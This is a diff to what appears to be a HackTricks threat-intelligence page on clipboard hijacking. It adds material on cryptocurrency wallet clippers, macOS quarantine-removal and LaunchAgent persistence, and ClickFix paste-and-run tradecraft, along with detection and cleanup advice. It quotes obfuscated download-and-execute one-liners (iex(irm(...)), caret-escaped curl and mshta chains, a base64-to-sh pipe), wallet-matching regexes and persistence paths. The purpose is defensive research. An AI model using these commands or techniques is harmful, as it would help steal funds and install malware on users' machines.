@@ -10,6 +10,66 @@ Clipboard hijacking – also known as *pastejacking* – abuses the fact that us
 
 Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.
 
+## Wallet-address replacement clippers
+
+Another **clipboard hijacking** variant does not paste commands at all: it waits until the victim copies a **cryptocurrency wallet address**, then silently swaps it for an attacker-controlled one just before paste. This is especially effective against long wallet formats because users often only verify the first/last characters.
+
+Common real-world traits:
+- **Thin loader + nested payload**: the visible app/exe looks like a legitimate trading or "profit" tool, while the real clipper is hidden deeper in the bundle (for example a .NET loader launching a nested Rust payload).
+- **Regex-driven replacement**: the malware matches strings such as `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, or even generic **44-character Solana-like** strings and rewrites them to attacker wallets.
+- **Wallet rotation at scale**: modern Windows samples may embed **thousands** of replacement wallets per currency instead of a single static address, reducing wallet reputation burn after each theft.
+
+### Windows clipper flow
+
+A common implementation is a hidden window registered with **`AddClipboardFormatListener`**. On each clipboard update, the malware typically calls:
+- **`OpenClipboard`** → access current clipboard data.
+- **`GetClipboardData`** → read text.
+- **`EmptyClipboard`** + **`SetClipboardData`** → replace the wallet string with the attacker value.
+
+Minimal hunting regexes frequently seen in clippers:
+
+```regex
+\b(bc1)[A-Za-z0-9]{26,45}\b
+\b(1)[A-Za-z0-9]{26,35}\b
+\b(3)[A-Za-z0-9]{26,35}\b
+\b(0x)[A-Za-z0-9]{40,46}\b
+\b(addr1)[A-Za-z0-9]{26,108}\b
+\b[A-Za-z0-9]{44}\b
+```
+
+User-level persistence is enough for impact. One observed pattern is:
+- Copy payload to **`%APPDATA%\silke\silke.exe`**
+- Create a **Startup-folder LNK** under `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
+
+Detection ideas:
+- Processes that call clipboard APIs continuously while also writing under `%APPDATA%` and the user **Startup** folder.
+- New LNK/executable creation followed by wallet-address clipboard rewrites.
+- Archives or fake-software bundles containing many unused files plus a small launcher that starts a nested binary.
+
+### macOS social-engineered quarantine removal + LaunchAgent persistence
+
+On macOS, some campaigns ship an **`unlocker.command`** helper and instruct the victim to right-click → **Open** if Gatekeeper says the app is damaged or from an unidentified developer. The script simply removes quarantine and launches the nearby `.app`:
+
+```bash
+/usr/bin/xattr -cr "$chosen"
+/usr/bin/open "$chosen"
+```
+
+This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.
+
+After execution, the clipper can persist as the current user by writing:
+- **`~/launch.sh`** – wrapper script
+- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`
+
+A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
+1. Kill the active clipper process.
+2. Unload/delete the LaunchAgent plist.
+3. Delete `~/launch.sh` and the copied payload.
+
+### Delivery note: fake reputation as a force multiplier
+
+For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.
+
 ## Forced copy buttons and hidden payloads (macOS one-liners)
 
 Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.
@@ -211,6 +271,17 @@ Detection/hunting tips for these variants
 - Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
 - File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.
 
+## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining
+
+Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.
+
+### Notable operator patterns
+
+- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
+- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
+- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
+- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
+- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -234,5 +305,7 @@ Detection/hunting tips for these variants
 - [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 - [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
+- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
 
 {{#include ../../banners/hacktricks-training.md}}
